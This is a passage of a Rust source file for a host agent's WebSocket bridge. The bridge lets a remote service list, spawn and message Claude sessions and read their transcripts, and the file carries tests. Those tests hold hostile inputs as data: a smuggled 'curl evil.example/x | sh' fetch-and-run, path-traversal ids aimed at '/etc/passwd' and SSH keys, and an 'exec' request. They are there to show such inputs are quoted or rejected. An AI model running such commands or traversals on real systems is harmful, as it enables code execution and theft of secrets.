//! The Redstone bridge: an outbound WebSocket that lets Redstone drive this
//! host's Claude sessions.
//!
//! Started by `rmux-agent bridge`, and enrolled by rmux writing
//! [`rmux_bridge::Enrolment`] to `~/.rmux/redstone.json`. See that crate for the
//! wire contract and for why the bridge lives on the host rather than in the
//! desktop app.
//!
//! ## It dials out, and it never listens
//!
//! There is no bound port anywhere in this file. A dev box behind NAT, a laptop
//! on hotel wifi and a VPC with no ingress at all are all reachable this way,
//! and none of them needs a firewall change, a public address or a certificate.
//!
//! ## Everything it can do, the operator could have done from rmux
//!
//! The dispatch table below is the entire capability of a stolen token, and it is
//! deliberately narrow: list what is running, start a Claude in a folder that
//! already exists, type into one, read a transcript. **There is no `exec`**, and
//! `rmux_bridge::protocol` carries a test that fails if anyone adds one.
//!
//! ## Reconnection is expected, not exceptional
//!
//! A host outlives any number of Redstone deploys, network partitions and laptop
//! lids. The loop below backs off and retries forever rather than exiting,
//! because a bridge that gives up is a host that silently stops answering — and
//! nothing on either side would say why.

use std::time::Duration;

use futures::{SinkExt, StreamExt};
use rmux_bridge::protocol::{
    Conversation, ErrorCode, Frame, Hello, HostInfo, Kind, Message, Request, Response,
    Role, Session, Status, VERSION,
};
use rmux_bridge::Enrolment;
use rmux_claude_core::{keys, launch, sessions as claude_sessions, transcript};
use tokio_tungstenite::tungstenite;

use crate::{alias, attach, status};

/// How long to wait before redialling, and the ceiling on that wait.
///
/// Capped rather than unbounded: a host that has been disconnected overnight must
/// come back within a minute of the far side returning, not within however long
/// the backoff had grown to. The floor is a second, because a Redstone restart
/// drops every bridge at once and an instant stampede is how a fleet turns one
/// deploy into an outage.
const REDIAL_MIN: Duration = Duration::from_secs(1);
const REDIAL_MAX: Duration = Duration::from_secs(60);

/// How long a connection must last to count as having worked.
///
/// Only a connection that survives this resets the backoff. A socket that is
/// accepted and closed immediately — a refused token, a server mid-deploy — is
/// not evidence of health however politely it ended.
const HEALTHY: Duration = Duration::from_secs(30);

/// The close code Redstone sends for an unknown or revoked token (RFC 6455
/// "policy violation"). Named, because a bare 1008 in a match arm is the sort
/// of constant nobody can look up a year later.
const REJECTED: u16 = 1008;

/// How long a spawned session is given to appear before the caller is answered.
const SPAWN_SETTLE: Duration = Duration::from_millis(500);

/// Default tail for a transcript read. See `rmux-claude-core`: a real one has
/// been measured at 228 MB.
const DEFAULT_TAIL_BYTES: u64 = 256 * 1024;
/// Ceiling on what a caller may ask for, however large a number it sends.
const MAX_TAIL_BYTES: u64 = 8 * 1024 * 1024;

/// Terminal size for a session the bridge creates.
///
/// A remote caller has no window, so there is no honest answer — but Claude has
/// to be told something, and a session someone later opens in rmux is resized to
/// their real window the moment they attach. 120x40 is a reasonable shape for
/// the transcript that gets recorded in the meantime.
const SPAWN_COLS: u16 = 120;
const SPAWN_ROWS: u16 = 40;

/// Run the bridge until the process is stopped.
pub async fn run() -> anyhow::Result<()> {
    // **Installed once, here, and not left to chance.** `tokio-tungstenite`
    // pulls `rustls` with no crypto provider selected, so without this the first
    // `connect_async` to a `wss://` URL panics with "no process-level
    // CryptoProvider available" — which on a host, over ssh, reads as the bridge
    // simply dying on startup. `ring` is compiled in via the workspace manifest.
    let _ = rustls::crypto::ring::default_provider().install_default();

    let Some(enrolment) = Enrolment::load()? else {
        anyhow::bail!(
            "this host is not enrolled with Redstone \
             (no ~/.rmux/redstone.json) — enrol it from rmux"
        );
    };

    let mut backoff = REDIAL_MIN;
    loop {
        let started = std::time::Instant::now();
        let outcome = serve(&enrolment).await;
        let lasted = started.elapsed();

        backoff = next_backoff(&outcome, lasted, backoff);
        match &outcome {
            Ok(Some(REJECTED)) => tracing::warn!(
                retry_in = ?backoff,
                "Redstone rejected this host's token (policy close). It may have been \
                 revoked — re-enrol the host from rmux.",
            ),
            Ok(code) => tracing::info!(?code, ?lasted, retry_in = ?backoff, "bridge closed"),
            Err(e) => tracing::warn!(error = %e, ?lasted, retry_in = ?backoff, "bridge disconnected"),
        }

        tokio::time::sleep(backoff).await;
    }
}

/// How long to wait before redialling.
///
/// **A clean close is not evidence that anything worked**, and the first version
/// assumed it was: it reset the backoff on every `Ok`, reasoning that a clean
/// close is an ordinary disconnect. But a server that *rejects* the token also
/// closes cleanly — Redstone answers an unknown or revoked one with a 1008 — so
/// a revoked host would have redialled **every second, for ever**, against
/// somebody's production box. That is precisely the failure this file exists to
/// avoid, sitting in the retry loop.
///
/// What earns a reset is a connection that *lasted*, not one that ended
/// politely. That rule applies to the error path too: a socket that served for
/// an hour and then dropped should come back quickly, and a dial that fails
/// instantly should not.
fn next_backoff(
    outcome: &anyhow::Result<Option<u16>>,
    lasted: Duration,
    current: Duration,
) -> Duration {
    // Retrying a refused credential faster does not make it more acceptable; it
    // just generates failed authentications on someone else's server.
    if matches!(outcome, Ok(Some(code)) if *code == REJECTED) {
        return REDIAL_MAX;
    }
    if lasted >= HEALTHY {
        return REDIAL_MIN;
    }
    (current * 2).min(REDIAL_MAX)
}

/// One connection, from dial to close.
///
/// Returns the close code the far side sent, when it sent one. That is what
/// lets [`run`] tell "your token is no good" apart from "the server restarted",
/// which are the same event as far as the socket is concerned and want opposite
/// retry behaviour.
async fn serve(enrolment: &Enrolment) -> anyhow::Result<Option<u16>> {
    let request = tungstenite::client::IntoClientRequest::into_client_request(
        enrolment.endpoint.as_str(),
    )
    .map(|mut request| {
        // **The token goes here and nowhere else.** Not in the URL — a query
        // string lands in every proxy log and every browser history — and not in
        // a frame, which would mean parsing input from anyone who can reach the
        // endpoint before knowing who they are.
        request.headers_mut().insert(
            "authorization",
            tungstenite::http::HeaderValue::from_str(&format!("Bearer {}", enrolment.token))
                .unwrap_or_else(|_| tungstenite::http::HeaderValue::from_static("")),
        );
        request
    })?;

    let (mut socket, _) = tokio_tungstenite::connect_async(request).await?;
    tracing::info!(endpoint = %enrolment.endpoint, "bridge connected");

    // Greet first, unprompted. Redstone needs the agent's version to explain a
    // missing method by naming the release that has it.
    socket
        .send(tungstenite::Message::Text(
            serde_json::to_string(&Hello {
                protocol: VERSION,
                agent_version: crate::provision::VERSION.to_owned(),
                host: host_info(),
            })?
            .into(),
        ))
        .await?;

    while let Some(message) = socket.next().await {
        match message? {
            tungstenite::Message::Text(text) => {
                // A frame this build cannot parse is answered, not fatal. A newer
                // Redstone talking to an older agent is the ordinary case — a
                // host may be running a daemon from weeks ago — and dropping the
                // connection over it would turn a missing feature into a machine
                // that appears offline.
                let response = match serde_json::from_str::<Frame>(&text) {
                    Ok(Frame::Request { id, request }) => (id, dispatch(request).await),

                    // Responses and events flow the other way. Redstone sending
                    // one is a bug on its side, not something to act on.
                    Ok(_) => continue,

                    // **Answered, not dropped.** The first version `continue`d
                    // here, and a live run against a method this build does not
                    // know produced no reply at all — the caller simply hung
                    // until it timed out. A caller cannot tell that apart from a
                    // dead host, which is precisely the wrong conclusion: a newer
                    // Redstone against an older agent is the *ordinary* case,
                    // since a host may run a daemon from weeks ago.
                    //
                    // The id is recovered on its own, because the request half is
                    // what failed to parse. Without an id there is nobody to
                    // answer, and only then is dropping it right.
                    Err(e) => {
                        let Some(id) = serde_json::from_str::<serde_json::Value>(&text)
                            .ok()
                            .and_then(|v| v.get("id").and_then(serde_json::Value::as_u64))
                        else {
                            tracing::debug!(%text, "unparseable frame with no id to answer");
                            continue;
                        };
                        let method = serde_json::from_str::<serde_json::Value>(&text)
                            .ok()
                            .and_then(|v| {
                                v.get("method").and_then(|m| m.as_str()).map(str::to_owned)
                            })
                            .unwrap_or_else(|| "that request".to_owned());
                        tracing::debug!(%text, error = %e, "unsupported request");
                        (
                            id,
                            Response::Error {
                                code: ErrorCode::Unsupported,
                                message: format!(
                                    "this agent ({}) does not support {method}",
                                    crate::provision::VERSION
                                ),
                            },
                        )
                    }
                };
                let (id, response) = response;
                socket
                    .send(tungstenite::Message::Text(
                        serde_json::to_string(&Frame::Response { id, response })?.into(),
                    ))
                    .await?;
            }
            // Answered by the library, but matched explicitly so a future
            // message kind is a compile error rather than a silent drop.
            tungstenite::Message::Ping(_) | tungstenite::Message::Pong(_) => {}
            tungstenite::Message::Close(frame) => {
                return Ok(frame.map(|f| u16::from(f.code)));
            }
            tungstenite::Message::Binary(_) | tungstenite::Message::Frame(_) => {}
        }
    }
    Ok(None)
}

/// Answer one request.
async fn dispatch(request: Request) -> Response {
    match request {
        Request::HostInfo => Response::Host { host: host_info() },

        Request::ListSessions => match live_sessions().await {
            Ok(sessions) => Response::Sessions { sessions },
            Err(e) => failed(e),
        },

        Request::ListConversations { limit, folder } => {
            match conversations(limit, folder.as_deref()).await {
                Ok(conversations) => Response::Conversations { conversations },
                Err(e) => failed(e),
            }
        }

        Request::ReadConversation { conversation, max_bytes } => match read_conversation(&conversation, max_bytes) {
            Ok((messages, truncated)) => Response::Conversation { messages, truncated },
            Err(e) => failed(e),
        },

        Request::Send { session, message } => {
            if message.trim().is_empty() {
                return refused("a message with no text would submit an empty prompt");
            }
            // **The same two-write sequence the desktop app uses**, from the same
            // module. Appending the carriage return to the text makes the TUI
            // treat the whole thing as one bracketed paste and swallow it, so the
            // message sits in the composer, typed but never sent — which reads
            // from Redstone as "it accepted my message and did nothing".
            let chunks = keys::send_message(&message);
            for (i, chunk) in chunks.iter().enumerate() {
                if i > 0 {
                    tokio::time::sleep(keys::SUBMIT_SETTLE).await;
                }
                match attach::write(&session, chunk).await {
                    Ok(true) => {}
                    Ok(false) => return not_found(&session),
                    Err(e) => return failed(e),
                }
            }
            Response::Ok
        }

        Request::Interrupt { session } => match attach::write(&session, keys::interrupt()).await {
            Ok(true) => Response::Ok,
            Ok(false) => not_found(&session),
            Err(e) => failed(e),
        },

        Request::Close { session } => {
            // Looked up first so a name nobody holds is `notFound` rather than a
            // cheerful `ok`. `kill` is deliberately idempotent and silent, which
            // is right for closing a tab and wrong for answering a caller.
            match attach::list().await {
                Ok(all) if !all.iter().any(|s| s.name == session) => not_found(&session),
                _ => match attach::kill(&session).await {
                    Ok(()) => Response::Ok,
                    Err(e) => failed(e),
                },
            }
        }

        Request::Spawn { folder, prompt, name, model_profile } => {
            match spawn(&folder, prompt.as_deref(), name.as_deref(), model_profile.as_deref())
                .await
            {
                Ok(session) => Response::Spawned { session },
                Err(e) => failed(e),
            }
        }
    }
}

fn failed(e: impl std::fmt::Display) -> Response {
    Response::Error { code: ErrorCode::Failed, message: e.to_string() }
}

fn refused(message: &str) -> Response {
    Response::Error { code: ErrorCode::Refused, message: message.to_owned() }
}

fn not_found(session: &str) -> Response {
    Response::Error {
        code: ErrorCode::NotFound,
        // Named, and with the likely cause, because a remote caller works from a
        // list it fetched some time ago and this is the routine outcome.
        message: format!("no session called {session} on this host; it may have ended"),
    }
}

/// This machine.
fn host_info() -> HostInfo {
    HostInfo {
        hostname: hostname(),
        // The account the agent runs as — the ceiling on everything the bridge
        // can do, so it is reported rather than left for anyone to assume.
        user: std::env::var("USER").or_else(|_| std::env::var("LOGNAME")).unwrap_or_default(),
        os: std::env::consts::OS.to_owned(),
        home: dirs::home_dir().map(|h| h.to_string_lossy().into_owned()),
    }
}

fn hostname() -> String {
    // **`gethostname`, not `/proc/sys/kernel/hostname`.** The first version read
    // procfs, which is correct on the Linux hosts the agent is usually installed
    // on and simply absent on macOS — where the agent also runs, for local
    // sessions. Measured against a real bridge: every macOS host reported
    // `"unknown"`, which is the name an operator would then see in Redstone's
    // host list for their own laptop.
    //
    // `$HOSTNAME` is not a fallback worth having: a login shell sets it and a
    // daemon started by ssh frequently has no such variable, so it would be
    // empty exactly when it was needed.
    #[cfg(unix)]
    {
        let mut buf = vec![0u8; 256];
        // SAFETY: `buf` is a valid writable allocation of `buf.len()` bytes, and
        // `gethostname` writes at most that many.
        let rc = unsafe { libc::gethostname(buf.as_mut_ptr() as *mut libc::c_char, buf.len()) };
        if rc == 0 {
            // Truncation leaves the buffer unterminated on some platforms, so the
            // NUL is found rather than assumed.
            let end = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
            let name = String::from_utf8_lossy(&buf[..end]).trim().to_owned();
            if !name.is_empty() {
                return name;
            }
        }
    }
    std::env::var("HOSTNAME").ok().filter(|s| !s.is_empty()).unwrap_or_else(|| "unknown".to_owned())
}

/// Everything running on this host, with the status Claude reports for it.
///
/// Three sources, joined here because no one of them is complete: the daemons
/// know what shells exist, `~/.rmux/aliases.json` knows what the operator calls
/// them, and Claude's own session files know what each one is *doing*.
async fn live_sessions() -> anyhow::Result<Vec<Session>> {
    let summaries = attach::list().await?;
    let aliases = alias::load();
    let statuses = status::snapshot();

    Ok(summaries
        .into_iter()
        .map(|s| {
            let kind = if s.name.starts_with("claude-") { Kind::Claude } else { Kind::Shell };

            // Matched on pid, which is the only field both sides agree on: the
            // daemon knows the shell's pid, and Claude records its own. Matching
            // on cwd would collapse two conversations in one checkout into one.
            let live = statuses.iter().find(|st| st.pid.is_some() && st.pid == s.pid);

            Session {
                title: aliases.get(&s.name).cloned(),
                kind,
                folder: live.and_then(|l| l.cwd.clone()),
                conversation_id: live.map(|l| l.session_id.clone()),
                status: live.map(|l| parse_status(&l.status)).unwrap_or(Status::Unknown),
                pid: s.pid,
                age_seconds: s.age_seconds,
                attached: s.attached,
                name: s.name,
            }
        })
        .collect())
}

/// Claude's vocabulary, carried through unchanged.
fn parse_status(raw: &str) -> Status {
    match raw {
        "busy" => Status::Busy,
        "waiting" => Status::Waiting,
        "idle" => Status::Idle,
        "shell" => Status::Shell,
        // A status this build has never heard of is `Unknown`, never a guess.
        // Claude adds them, and mapping an unrecognised one onto `Idle` would
        // report a working session as finished.
        _ => Status::Unknown,
    }
}

/// Every conversation recorded on this host.
///
/// Runs `rmux-claude-core`'s own listing script locally — the same script the
/// desktop app runs over ssh, so the two cannot disagree about which
/// conversations exist or where Claude keeps them. That matters more than it
/// sounds: **Claude's project-directory scheme is not computable**, it changed
/// between versions, and the script is where every spelling is tried.
async fn conversations(
    limit: Option<u32>,
    folder: Option<&str>,
) -> anyhow::Result<Vec<Conversation>> {
    let out = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(claude_sessions::list_all_sessions_script())
        .output()
        .await?;

    let running = status::snapshot();
    let mut all: Vec<Conversation> = claude_sessions::parse_all_sessions(&out.stdout)
        .into_iter()
        .map(|info| Conversation {
            running: running.iter().any(|r| r.session_id == info.id),
            id: info.id,
            folder: info.folder,
            summary: info.title,
            // **Seconds here, milliseconds on the wire.** The listing script
            // reports `mtime` in whole seconds while Claude's own status files
            // are in milliseconds, and one protocol carrying both units is how a
            // timestamp ends up 1000× wrong in somebody's UI. Everything in
            // `rmux-bridge` is milliseconds; the conversion belongs here, once.
            modified: Some(info.modified.saturating_mul(1000)),
            // The listing does not report a size, and inventing one would be
            // worse than admitting it: a caller sizing a read off a guess would
            // ask for the wrong tail.
            size: None,
        })
        .collect();

    if let Some(folder) = folder {
        let folder = folder.trim_end_matches('/');
        all.retain(|c| {
            c.folder.as_deref().is_some_and(|f| {
                let f = f.trim_end_matches('/');
                // Prefix match on a *path boundary*, so `/srv/api` does not also
                // return `/srv/api-staging`.
                f == folder || f.strip_prefix(folder).is_some_and(|rest| rest.starts_with('/'))
            })
        });
    }

    // Newest first, then bounded. A host in use for a year holds thousands, and
    // an unbounded answer is one nobody can render — but truncating before
    // sorting would return an arbitrary thousand rather than the newest.
    all.sort_by_key(|c| std::cmp::Reverse(c.modified.unwrap_or(0)));
    if let Some(limit) = limit {
        all.truncate(limit as usize);
    }
    Ok(all)
}

/// Read one conversation back, tail-bounded.
fn read_conversation(id: &str, max_bytes: Option<u64>) -> anyhow::Result<(Vec<Message>, bool)> {
    let tail = max_bytes.unwrap_or(DEFAULT_TAIL_BYTES).clamp(1, MAX_TAIL_BYTES);

    let path = find_transcript(id)?;
    let size = std::fs::metadata(&path)?.len();
    let truncated = size > tail;

    let bytes = if truncated {
        use std::io::{Read, Seek, SeekFrom};
        let mut file = std::fs::File::open(&path)?;
        file.seek(SeekFrom::Start(size - tail))?;
        let mut buf = Vec::with_capacity(tail as usize);
        file.take(tail).read_to_end(&mut buf)?;
        buf
    } else {
        std::fs::read(&path)?
    };

    // `truncated` is passed through so the parser drops the leading partial
    // line. Getting this wrong in the other direction — claiming a complete read
    // — silently discards the first message of a short conversation.
    let parsed = transcript::parse(&bytes, truncated);

    Ok((
        parsed
            .entries
            .into_iter()
            .map(|e| Message {
                role: match e.speaker {
                    transcript::Speaker::User => Role::User,
                    transcript::Speaker::Assistant => Role::Assistant,
                    transcript::Speaker::Tool => Role::Tool,
                    // Slash-command plumbing, caveat banners and system reminders
                    // are recorded by Claude as *user* messages and dominate the
                    // tail of a long session; the parser has already demoted them
                    // to `System`, so a reader can drop them without knowing the
                    // shape of each one.
                    transcript::Speaker::System => Role::System,
                },
                text: e.text,
                at: e.timestamp,
                tool: e.tool,
            })
            .collect(),
        truncated,
    ))
}

/// Where Claude keeps the transcript for a conversation id.
///
/// Searched rather than derived. The project directory's name is a slug of the
/// folder, and **that slug's scheme changed between Claude versions**, so
/// building the path from a `cwd` is right on one host and wrong on the next.
/// The file is named for the session id, which has not changed.
fn find_transcript(id: &str) -> anyhow::Result<std::path::PathBuf> {
    // Refused before it reaches the filesystem. The id comes from a remote
    // caller, and `../../.ssh/id_ed25519` under a `.jsonl` join would otherwise
    // read whatever it liked out of the home directory.
    anyhow::ensure!(
        !id.is_empty()
            && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'),
        "{id:?} is not a conversation id",
    );

    let home = dirs::home_dir().ok_or_else(|| anyhow::anyhow!("no home directory"))?;
    let projects = home.join(".claude").join("projects");
    let wanted = format!("{id}.jsonl");

    for entry in std::fs::read_dir(&projects)?.flatten() {
        let candidate = entry.path().join(&wanted);
        if candidate.is_file() {
            return Ok(candidate);
        }
    }
    anyhow::bail!("no transcript for conversation {id} on this host")
}

/// Start a Claude session in `folder`.
async fn spawn(
    folder: &str,
    prompt: Option<&str>,
    name: Option<&str>,
    model_profile: Option<&str>,
) -> anyhow::Result<Session> {
    // A model profile decides **where the operator's credential is sent**, so an
    // unknown name is refused rather than quietly falling back to Anthropic.
    // Silently changing provider is the failure worth being loud about — and the
    // bridge has no profile store of its own, so any name at all is unknown here.
    anyhow::ensure!(
        model_profile.is_none(),
        "model profiles are applied by rmux, not the bridge; \
         start this session from rmux if it needs a specific provider",
    );

    let folder = expand_home(folder)?;
    // **Must already exist.** Creating it would mean a typo in an agent's tool
    // call silently produces a directory tree on someone's server.
    anyhow::ensure!(
        std::path::Path::new(&folder).is_dir(),
        "{folder} is not a directory on this host",
    );

    // The prompt travels as an *argument* rather than being typed in afterwards.
    // Typing means guessing when the TUI is ready to receive it, and a guess that
    // is early loses the message into a composer that has not been drawn yet.
    // `launch_line` shell-quotes it, which is the injection boundary that matters
    // most in this whole feature — it is free text from a remote caller landing
    // in a login shell.
    let args: Vec<String> = prompt
        .map(str::trim)
        .filter(|p| !p.is_empty())
        .map(|p| vec![p.to_owned()])
        .unwrap_or_default();
    let line = launch::launch_line(None, &args, launch::Rendering::default());

    // Named like every other Claude session, so rmux's rail adopts it as one
    // rather than showing a stranger. The suffix is the host's clock rather than
    // a counter: two spawns in the same second from different callers must not
    // collide onto one shell.
    let session = format!(
        "claude-{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or_default()
    );

    attach::spawn_detached(&session, &folder, &line, SPAWN_COLS, SPAWN_ROWS).await?;

    if let Some(name) = name.map(str::trim).filter(|n| !n.is_empty()) {
        // Best-effort: a session that started but could not be named is still a
        // session, and failing the whole spawn over a label would be worse than
        // returning it with the raw key.
        let live: Vec<String> = attach::list()
            .await
            .unwrap_or_default()
            .into_iter()
            .map(|s| s.name)
            .collect();
        if let Err(e) = alias::set(&session, name, &live) {
            tracing::warn!(error = %e, "could not name the spawned session");
        }
    }

    // Give the daemon a moment so the answer carries a real pid and status
    // rather than an empty shell of a record the caller has to poll for.
    tokio::time::sleep(SPAWN_SETTLE).await;

    Ok(live_sessions()
        .await?
        .into_iter()
        .find(|s| s.name == session)
        .unwrap_or(Session {
            name: session,
            kind: Kind::Claude,
            folder: Some(folder),
            title: name.map(str::to_owned),
            ..Default::default()
        }))
}

/// Resolve a leading `~`, which a remote caller has no way to expand itself.
fn expand_home(folder: &str) -> anyhow::Result<String> {
    let Some(rest) = folder.strip_prefix("~/").or_else(|| folder.strip_prefix("~")) else {
        return Ok(folder.to_owned());
    };
    let home = dirs::home_dir().ok_or_else(|| anyhow::anyhow!("no home directory"))?;
    let rest = rest.trim_start_matches('/');

    // `Path::join("")` appends a separator, so a bare `~` would expand to
    // `/home/dev.user/` — which then reaches Redstone's UI, and rmux's rail, as a
    // folder that does not string-compare equal to the same directory written
    // any other way.
    if rest.is_empty() {
        return Ok(home.to_string_lossy().into_owned());
    }
    Ok(home.join(rest).to_string_lossy().into_owned())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_unknown_claude_status_is_unknown_rather_than_idle() {
        // Claude adds statuses. Mapping an unrecognised one onto `Idle` would
        // report a session that is plainly working as finished, which is the
        // rail's single most important signal being wrong.
        assert_eq!(parse_status("busy"), Status::Busy);
        assert_eq!(parse_status("waiting"), Status::Waiting);
        assert_eq!(parse_status("compacting"), Status::Unknown);
        assert_eq!(parse_status(""), Status::Unknown);
    }

    #[test]
    fn a_conversation_id_cannot_walk_out_of_the_projects_directory() {
        // The id arrives from a remote caller and is joined onto a path. Without
        // this check, `../../.ssh/id_ed25519` (with a crafted suffix) would read
        // whatever it liked out of the home directory.
        for hostile in ["../../../etc/passwd", "..", "a/b", "a/../../b", ""] {
            assert!(
                find_transcript(hostile).is_err(),
                "{hostile:?} was not rejected",
            );
        }
    }

    #[test]
    fn a_home_relative_folder_is_expanded() {
        // A remote caller cannot know the operator's home path, so `~/api` is the
        // natural thing for an agent to send.
        let home = dirs::home_dir().unwrap().to_string_lossy().into_owned();
        assert_eq!(expand_home("~/api").unwrap(), format!("{home}/api"));
        assert_eq!(expand_home("~").unwrap(), home);
        assert_eq!(expand_home("/srv/api").unwrap(), "/srv/api");
    }

    #[test]
    fn a_spawn_prompt_is_quoted_into_one_argument() {
        // The single highest-risk path in the feature: free text from a remote
        // caller, landing in a login shell line.
        let line = launch::launch_line(
            None,
            &["ship it; curl evil.example/x | sh".into()],
            launch::Rendering::default(),
        );
        assert!(
            line.ends_with("claude 'ship it; curl evil.example/x | sh'"),
            "prompt was not contained: {line}"
        );
    }

    /// The transport, end to end, against a real WebSocket server.
    ///
    /// Everything else in this file is testable as a pure function; this is the
    /// part that is not, and it is the part that fails on a host at three in the
    /// morning. Three things are proven here and each has its own way of being
    /// silently wrong:
    ///
    /// - the **`Authorization` header is actually sent**, so a token that never
    ///   leaves the file cannot pass for an authenticated bridge;
    /// - the greeting is emitted **unprompted**, before anything asks — a bridge
    ///   that waits to be spoken to would hang against a server that is waiting
    ///   for it;
    /// - a request is answered with a frame carrying **the same `id`**, which is
    ///   the whole basis of demultiplexing and looks fine right up until two
    ///   requests are in flight.
    ///
    /// `ws://` rather than `wss://` deliberately: TLS is rustls's to get right,
    /// and a self-signed certificate here would test our willingness to trust one.
    // The callback's signature is tungstenite's, not ours: `accept_hdr_async`
    // requires exactly `Result<Response, ErrorResponse>`, and `ErrorResponse` is
    // an `http::Response` at 136 bytes. Boxing it would not typecheck.
    #[allow(clippy::result_large_err)]
    #[tokio::test]
    async fn the_transport_greets_authenticates_and_answers_by_id() {
        use tokio_tungstenite::tungstenite::handshake::server::{
            ErrorResponse, Request as HandshakeRequest, Response as HandshakeResponse,
        };

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();

            let seen_auth = std::sync::Arc::new(std::sync::Mutex::new(None::<String>));
            let captured = std::sync::Arc::clone(&seen_auth);
            let mut socket = tokio_tungstenite::accept_hdr_async(
                stream,
                move |request: &HandshakeRequest,
                      response: HandshakeResponse|
                      -> Result<HandshakeResponse, ErrorResponse> {
                    *captured.lock().unwrap() = request
                        .headers()
                        .get("authorization")
                        .and_then(|v| v.to_str().ok())
                        .map(str::to_owned);
                    Ok(response)
                },
            )
            .await
            .unwrap();

            // The greeting must arrive with nothing having asked for it.
            let greeting = match socket.next().await.unwrap().unwrap() {
                tungstenite::Message::Text(text) => text.to_string(),
                other => panic!("expected the hello, got {other:?}"),
            };

            // A method with no side effects: `hostInfo` touches no daemon and
            // starts nothing, so this test never leaves a shell behind.
            socket
                .send(tungstenite::Message::Text(
                    serde_json::to_string(&Frame::Request { id: 99, request: Request::HostInfo })
                        .unwrap()
                        .into(),
                ))
                .await
                .unwrap();

            let reply = match socket.next().await.unwrap().unwrap() {
                tungstenite::Message::Text(text) => text.to_string(),
                other => panic!("expected a response, got {other:?}"),
            };

            let auth = seen_auth.lock().unwrap().clone();
            socket.close(None).await.ok();
            (auth, greeting, reply)
        });

        let enrolment = Enrolment {
            endpoint: format!("ws://127.0.0.1:{port}/bridge"),
            token: "rbt_test_token".into(),
            host_id: None,
            enrolled_by: None,
            enrolled_at: None,
        };
        serve(&enrolment).await.expect("the bridge should run to a clean close");

        let (auth, greeting, reply) = server.await.unwrap();

        assert_eq!(
            auth.as_deref(),
            Some("Bearer rbt_test_token"),
            "the token never reached the wire",
        );

        let hello: Hello = serde_json::from_str(&greeting).expect("the greeting must parse");
        assert_eq!(hello.protocol, VERSION);
        assert_eq!(hello.agent_version, crate::provision::VERSION);
        // The token must not be anywhere in the frame — it belongs in the header
        // alone, or it lands in every log that records a message body.
        assert!(!greeting.contains("rbt_test_token"), "the token leaked into a frame: {greeting}");

        match serde_json::from_str::<Frame>(&reply).expect("the response must parse") {
            Frame::Response { id, response: Response::Host { .. } } => {
                assert_eq!(id, 99, "a response must carry the id of its request");
            }
            other => panic!("answered with {other:?}"),
        }
    }

    #[test]
    fn the_host_names_itself_on_this_platform() {
        // The first version read `/proc/sys/kernel/hostname`, which is correct on
        // the Linux hosts the agent usually runs on and absent on macOS — where
        // it also runs, for local sessions. Measured against a real bridge: every
        // macOS host announced itself as `"unknown"`, which is what an operator
        // would then see in Redstone's host list for their own laptop.
        //
        // Asserted as "not the fallback" rather than against a fixed name, since
        // the right answer differs on every machine this runs on.
        let name = hostname();
        assert!(!name.is_empty());
        assert_ne!(name, "unknown", "the host could not name itself");
    }

    /// An unknown method is answered rather than ignored.
    ///
    /// Found by running it: a live bridge given `{"method":"exec"}` produced *no
    /// reply at all*, and the caller hung until it timed out. A caller cannot
    /// tell that apart from a dead host — the wrong conclusion, since a newer
    /// Redstone against an older agent is the ordinary case.
    ///
    /// Note what this also pins: an unknown method is answered with an **error**,
    /// never executed. `exec` is the example on purpose.
    #[allow(clippy::result_large_err)]
    #[tokio::test]
    async fn an_unknown_method_is_answered_rather_than_ignored() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut socket = tokio_tungstenite::accept_async(stream).await.unwrap();
            let _greeting = socket.next().await.unwrap().unwrap();

            socket
                .send(tungstenite::Message::Text(
                    r#"{"id":41,"method":"exec","cmd":"id"}"#.into(),
                ))
                .await
                .unwrap();

            let reply = match socket.next().await.unwrap().unwrap() {
                tungstenite::Message::Text(text) => text.to_string(),
                other => panic!("expected a response, got {other:?}"),
            };
            socket.close(None).await.ok();
            reply
        });

        let enrolment = Enrolment {
            endpoint: format!("ws://127.0.0.1:{port}/bridge"),
            token: "t".into(),
            host_id: None,
            enrolled_by: None,
            enrolled_at: None,
        };
        serve(&enrolment).await.unwrap();

        let reply = server.await.unwrap();
        match serde_json::from_str::<Frame>(&reply).expect("the answer must parse") {
            Frame::Response { id, response: Response::Error { code, message } } => {
                assert_eq!(id, 41, "the answer must carry the request's id");
                assert_eq!(code, ErrorCode::Unsupported);
                assert!(message.contains("exec"), "the method should be named: {message}");
            }
            other => panic!("answered with {other:?}"),
        }
    }

    /// A keepalive ping is answered even with no application traffic.
    ///
    /// Redstone's keepalive is **protocol-level** WebSocket pings from uvicorn,
    /// roughly every 20s, and it sends no application-level ping method — quite
    /// rightly, since this bridge would answer `unsupported` to every one.
    ///
    /// So the pong has to come out of the read path with nothing else flowing.
    /// tungstenite queues a pong on receipt, but a queued frame that is never
    /// flushed is a connection that dies at the load balancer's idle timeout —
    /// and the symptom is a host that silently disappears about a minute after
    /// connecting, which reads as a network fault rather than a missing flush.
    #[tokio::test]
    async fn a_keepalive_ping_is_answered_without_any_application_traffic() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut socket = tokio_tungstenite::accept_async(stream).await.unwrap();
            let _greeting = socket.next().await.unwrap().unwrap();

            let mut pongs = 0;
            for n in 0..3u8 {
                socket
                    .send(tungstenite::Message::Ping(vec![n].into()))
                    .await
                    .unwrap();

                // Nothing else is sent, so anything that comes back is the
                // answer to the ping.
                match tokio::time::timeout(
                    std::time::Duration::from_secs(5),
                    socket.next(),
                )
                .await
                {
                    Ok(Some(Ok(tungstenite::Message::Pong(_)))) => pongs += 1,
                    other => panic!("expected a pong, got {other:?}"),
                }
            }
            socket.close(None).await.ok();
            pongs
        });

        let enrolment = Enrolment {
            endpoint: format!("ws://127.0.0.1:{port}/bridge"),
            token: "t".into(),
            host_id: None,
            enrolled_by: None,
            enrolled_at: None,
        };
        serve(&enrolment).await.unwrap();

